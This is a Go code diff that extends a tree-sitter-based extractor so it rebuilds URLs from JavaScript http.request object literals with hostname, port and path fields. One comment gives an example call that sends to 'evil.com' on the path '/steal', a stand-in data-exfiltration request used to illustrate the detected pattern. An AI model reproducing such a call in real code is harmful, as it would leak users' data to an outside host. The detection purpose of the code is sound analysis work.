@@ -157,7 +157,8 @@ func matchHTTPClientCall(callNode *sitter.Node, content []byte) (string, string)
 }
 
 // extractURLArgTS extracts a URL string from the first argument in an arguments node.
-// Handles string literals and template literals without interpolation.
+// Handles string literals, template literals without interpolation, and object literals
+// with hostname/host properties (for http.request({hostname: '...', path: '...'}) pattern).
 func extractURLArgTS(argsNode *sitter.Node, content []byte) string {
 	for i := 0; i < int(argsNode.ChildCount()); i++ {
 		child := argsNode.Child(i)
@@ -167,6 +168,13 @@ func extractURLArgTS(argsNode *sitter.Node, content []byte) string {
 			val = strings.Trim(val, `"'`)
 			if isURLLike(val) {
 				return val
+			}
+		case "object":
+			// Pattern: http.request({hostname: 'evil.com', port: 8080, path: '/steal'})
+			// Extract hostname + path to construct a URL-like string.
+			url := extractHostnameFromObject(child, content)
+			if url != "" {
+				return url
 			}
 		case "template_string":
 			// Only extract if no interpolation (no template_substitution children).
@@ -210,6 +218,50 @@ func extractURLPath(rawURL string) string {
 		return ""
 	}
 	return u.Path
+}
+
+// extractHostnameFromObject extracts a URL from an object literal with hostname/host
+// and optional path properties. Handles the http.request({hostname: '...', path: '...'}) pattern.
+func extractHostnameFromObject(objNode *sitter.Node, content []byte) string {
+	var hostname, path, port string
+	for i := 0; i < int(objNode.ChildCount()); i++ {
+		child := objNode.Child(i)
+		if child.Type() != "pair" {
+			continue
+		}
+		key := child.ChildByFieldName("key")
+		val := child.ChildByFieldName("value")
+		if key == nil || val == nil {
+			continue
+		}
+		keyName := key.Content(content)
+		// Strip quotes from key if property_identifier vs string
+		keyName = strings.Trim(keyName, `"'`)
+		valStr := strings.Trim(val.Content(content), `"'`)
+
+		switch keyName {
+		case "hostname", "host":
+			hostname = valStr
+		case "path":
+			path = valStr
+		case "port":
+			port = valStr
+		}
+	}
+	if hostname == "" {
+		return ""
+	}
+	// Reconstruct a URL-like string for the endpoint extractor
+	url := "http://" + hostname
+	if port != "" {
+		url += ":" + port
+	}
+	if path != "" {
+		url += path
+	} else {
+		url += "/"
+	}
+	return url
 }
 
 // deriveHTTPMethodFromClientCall maps an HTTP client method name to an HTTP method string.
